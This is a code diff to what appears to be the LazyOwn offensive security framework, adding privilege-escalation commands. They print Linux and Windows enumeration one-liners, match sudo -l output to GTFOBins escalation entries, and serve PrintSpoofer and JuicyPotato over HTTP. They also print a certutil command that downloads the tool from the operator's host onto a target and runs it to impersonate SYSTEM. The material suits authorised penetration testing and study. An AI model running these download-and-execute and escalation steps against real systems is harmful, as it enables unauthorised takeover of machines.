@@ -439,5 +439,243 @@ class PrivilegeEscalationCommandSet(LazyOwnCommandSet):
             print_warn(f"'{binary}' not found in GTFOBins or LOLBas.")
             print_msg(GTFO_ONLINE_REFERENCE)
 
+    @cmd2.with_category(privilege_escalation_category)
+    def do_whoami_priv(self, line):
+        """Print privilege enumeration commands for the target OS.
+
+        Detects the target OS from ``payload.json`` or ``sessions/os.json``
+        and prints a ready-to-paste set of commands that reveal the current
+        user's privileges, group memberships, and dangerous tokens.
+
+        Args:
+            line: Unused.
+
+        Returns:
+            None.
+        """
+        del line
+        os_id = self.params.get("os_id", "")
+        if not os_id:
+            os_json_path = os.path.join(_sessions_directory(self.path), OS_JSON_FILENAME)
+            if os.path.isfile(os_json_path):
+                try:
+                    with open(os_json_path, encoding="utf-8") as handle:
+                        os_data = json.load(handle)
+                    if isinstance(os_data, list) and os_data:
+                        os_id = str(os_data[0].get("id", ""))
+                except (OSError, json.JSONDecodeError):
+                    pass
+        if os_id == "2":
+            self._whoami_priv_windows()
+            return
+        self._whoami_priv_linux()
+
+    def _whoami_priv_linux(self):
+        """Print Linux privilege enumeration commands."""
+        print_msg("Paste on target to enumerate Linux privileges:")
+        print_msg("  id")
+        print_msg("  sudo -l 2>/dev/null")
+        print_msg("  getcap -r / 2>/dev/null")
+        print_msg("  find / -perm -4000 -type f 2>/dev/null")
+        print_msg("  find / -perm -2000 -type f 2>/dev/null")
+        print_msg("  groups")
+        print_msg("  cat /etc/crontab 2>/dev/null")
+        print_msg("  ls -la /etc/cron.* 2>/dev/null")
+        print_msg("  ss -tlnp 2>/dev/null || netstat -tlnp 2>/dev/null")
+        print_msg("")
+        print_msg("Then analyse the output with crystal_ball --auto")
+        print_msg("or look up sudo binaries with: gtfo <binary>")
+
+    def _whoami_priv_windows(self):
+        """Print Windows privilege enumeration commands."""
+        print_msg("Paste on target to enumerate Windows privileges:")
+        print_msg("  whoami /priv")
+        print_msg("  whoami /groups")
+        print_msg("  whoami /all")
+        print_msg("  net user %USERNAME%")
+        print_msg("  icacls C:\\* 2>nul")
+        print_msg("  reg query HKLM\\SOFTWARE\\Policies\\Microsoft\\Windows\\Installer /v AlwaysInstallElevated")
+        print_msg("  wmic service get name,displayname,pathname,startmode | findstr /i auto")
+        print_msg("  schtasks /query /fo LIST /v")
+        print_msg("  netstat -ano | findstr LISTENING")
+        print_msg("")
+        print_msg("Then analyse the output with crystal_ball --auto")
+
+    @cmd2.with_category(privilege_escalation_category)
+    def do_sudo_privesc(self, line):
+        """Analyse sudo -l output and cross-reference with GTFOBins.
+
+        Reads sudo -l output from a session file or command argument and
+        identifies binaries with documented privilege escalation bypasses
+        from the GTFOBins parquet knowledge base.
+
+        Args:
+            line: Optional path to a file containing sudo -l output.
+                When empty, attempts to read from the last session report.
+
+        Returns:
+            None.
+        """
+        sudo_output = ""
+        target = (line or "").strip()
+        if target and os.path.isfile(target):
+            try:
+                with open(target, encoding="utf-8", errors="ignore") as handle:
+                    sudo_output = handle.read()
+            except OSError:
+                print_error(f"Cannot read {target}")
+                return
+        if not sudo_output:
+            session_csv = os.path.join(_sessions_directory(self.path), "LazyOwn_session_report.csv")
+            if os.path.isfile(session_csv):
+                try:
+                    import csv
+                    with open(session_csv, encoding="utf-8", errors="ignore") as handle:
+                        for row in csv.DictReader(handle):
+                            out = row.get("output", "")
+                            if "sudo" in out.lower() or "NOPASSWD" in out:
+                                sudo_output += out + "\n"
+                except Exception:
+                    pass
+        if not sudo_output:
+            print_msg("Usage: sudo_privesc <file_with_sudo_minus_l_output>")
+            print_msg("First run 'sudo -l' on the target and save the output to a file.")
+            print_msg("Or pass output via a session file.")
+            return
+        import re
+        import os as _os
+        sudo_binaries: list[str] = []
+        patterns = [
+            r"\(\S+\)\s+NOPASSWD:\s*(\S+)",
+            r"\(\S+:\S+\)\s+NOPASSWD:\s*(\S+)",
+            r"\(\S+\)\s+(\S+)",
+            r"\(\S+:\S+\)\s+(\S+)",
+            r"NOPASSWD:\s*(\S+)",
+        ]
+        for pattern in patterns:
+            for match in re.finditer(pattern, sudo_output):
+                binary_path = match.group(1).strip()
+                binary_name = _os.path.basename(binary_path).strip()
+                if binary_name and binary_name not in sudo_binaries:
+                    sudo_binaries.append(binary_name)
+        if not sudo_binaries:
+            print_msg("No sudo-allowed binaries detected in output.")
+            return
+        print_msg(f"Detected {len(sudo_binaries)} sudo-allowed binaries:")
+        for b in sorted(sudo_binaries):
+            print_msg(f"  {b}")
+        print_msg("")
+        try:
+            import pandas
+        except ImportError:
+            print_error("pandas required: pip install pandas pyarrow")
+            return
+        parquet_path = os.path.join(self.path, GTFO_PARQUETS_DIRECTORY, GTFO_GTFOBINS_FILE)
+        if not os.path.isfile(parquet_path):
+            print_error(f"GTFOBins parquet not found at {parquet_path}")
+            print_msg(GTFO_ONLINE_REFERENCE)
+            return
+        frame = pandas.read_parquet(parquet_path)
+        print_msg("GTFOBins sudo matches:")
+        found = 0
+        for b in sorted(sudo_binaries):
+            mask = frame[GTFO_BINARY_COLUMN].str.lower() == b.lower()
+            hits = frame[mask]
+            if hits.empty:
+                continue
+            found += 1
+            for _, row in hits.iterrows():
+                function_name = row.get("Function Name", "")
+                sudo_row = str(row.get("SUID", "")) or str(row.get("Sudo", ""))
+                description = str(row.get("Description", ""))[:GTFO_DESCRIPTION_PREVIEW]
+                print_msg(f"  [{b}] {function_name} | {description}")
+                if sudo_row and sudo_row != "nan":
+                    print_msg(f"    {sudo_row[:GTFO_EXAMPLE_PREVIEW]}")
+        if not found:
+            print_warn("None of the detected binaries matched GTFOBins entries.")
+            print_msg(GTFO_ONLINE_REFERENCE)
+        else:
+            print_msg(f"\n{found} binary(s) have documented sudo privesc vectors.")
+
+    @cmd2.with_category(privilege_escalation_category)
+    def do_printspoofer(self, line):
+        """Serve PrintSpoofer over HTTP for Windows privilege escalation.
+
+        Searches for ``PrintSpoofer64.exe`` in configured directories,
+        copies it to ``sessions/`` and serves it via HTTP. Prints the
+        target one-liner for download + execution.
+
+        Args:
+            line: Unused.
+
+        Returns:
+            None.
+        """
+        del line
+        return self._serve_windows_tool("PrintSpoofer64.exe", "PrintSpoofer",
+                                        "Impersonate SYSTEM via SeImpersonatePrivilege",
+                                        "\\\\localhost\\pipe\\spoolss")
+
+    @cmd2.with_category(privilege_escalation_category)
+    def do_juicypotato(self, line):
+        """Serve JuicyPotato over HTTP for Windows privilege escalation.
+
+        Searches for ``JuicyPotato.exe`` in configured directories,
+        copies it to ``sessions/`` and serves it via HTTP. Prints the
+        target one-liner for download + execution.
+
+        Args:
+            line: Optional CLSID for the potato attack. Defaults to
+                the BITS CLSID when omitted.
+
+        Returns:
+            None.
+        """
+        clsid = (line or "").strip()
+        default_clsid = "{4991d34b-80a1-4291-83b6-3328366b9097}"
+        use_clsid = clsid if clsid and clsid.startswith("{") else default_clsid
+        self._serve_windows_tool("JuicyPotato.exe", "JuicyPotato",
+                                  "Impersonate SYSTEM via SeImpersonatePrivilege (potato)",
+                                  f" -t * -p C:\\\\Windows\\\\System32\\\\cmd.exe -l 1337 -c {use_clsid}")
+
+    def _serve_windows_tool(self, binary: str, label: str, description: str, args: str) -> None:
+        """Serve a Windows privilege escalation binary over HTTP.
+
+        Args:
+            binary: Filename to search for and serve.
+            label: Human-readable tool name for log messages.
+            description: One-line description of the technique.
+            args: Additional CLI arguments for the tool on the target.
+
+        Returns:
+            None.
+        """
+        lhost = self.params.get("lhost") or ""
+        lport = self.params.get("lport", DEFAULT_HTTP_LPORT)
+        if not check_lhost(lhost):
+            return
+        candidates = (
+            os.path.join("external", ".exploit", binary),
+            os.path.join("external", binary),
+            os.path.join("/usr", "share", "lazyown", binary),
+            os.path.join("/opt", binary),
+        )
+        source = next((p for p in candidates if os.path.isfile(p)), None)
+        if not source:
+            print_error(f"{binary} not found. Place it under external/ or install peass.")
+            print_msg(f"{label}: {description}")
+            return
+        sessions_path = _sessions_directory(self.path)
+        destination = os.path.join(sessions_path, binary)
+        if not os.path.exists(destination):
+            os.makedirs(sessions_path, exist_ok=True)
+            shutil.copy2(source, destination)
+        print_msg(f"Serving {label} via http://{lhost}:{lport}/{binary}")
+        print_msg(f"{label}: {description}")
+        print_msg("Run on target (cmd.exe as low-priv user):")
+        print_msg(f'  certutil -urlcache -split -f "http://{lhost}:{lport}/{binary}" %TEMP%\\{binary}')
+        print_msg(f"  %TEMP%\\{binary}{args}")
+        _serve_via_http(self, binary, sessions_path, lport)
+
 
 __all__ = ["PrivilegeEscalationCommandSet"]
